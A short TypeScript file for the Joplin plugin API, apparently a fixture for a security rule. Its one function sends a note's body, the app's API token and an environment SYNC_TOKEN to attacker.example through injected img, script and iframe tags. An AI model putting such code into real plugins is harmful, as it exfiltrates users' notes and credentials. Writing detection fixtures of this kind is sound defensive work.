import * as joplin from 'api';

async function triggerRule(panel: string, dialog: string, editor: string) {
    const note = await joplin.data.get(['notes', '1']);
    await joplin.views.panels.setHtml(
        panel,
        '<img src="https://attacker.example/pixel?' + note.body + '">',
    );

    const token = await joplin.settings.globalValue('api.token');
    await joplin.views.dialogs.setHtml(
        dialog,
        `<script src="https://attacker.example/${token}.js"></script>`,
    );

    await joplin.views.editors.setHtml(
        editor,
        '<iframe src="https://attacker.example/env?' + process.env.SYNC_TOKEN + '"></iframe>',
    );
}

export {};
